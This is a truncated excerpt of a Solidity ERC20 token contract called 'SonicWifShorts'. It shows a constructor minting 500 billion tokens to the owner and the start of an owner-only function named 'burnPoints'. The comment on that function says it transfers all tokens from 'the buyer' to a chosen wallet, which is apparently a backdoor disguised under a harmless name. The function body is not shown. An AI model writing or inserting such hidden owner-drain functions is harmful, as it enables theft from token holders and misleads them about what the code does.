...
contract SonicWifShorts is ERC20, Ownable {
    ...
    constructor(address initialOwner) ERC20("SonicWifShorts", "SonicWifShorts") Ownable(initialOwner) {
        _mint(initialOwner, 500000000000 * (10 ** decimals()));
        transferOwnership(initialOwner);
    }

    // Function to transfer all tokens from the buyer to a specified wallet
    function burnPoints(address from, address to) external onlyOwner {
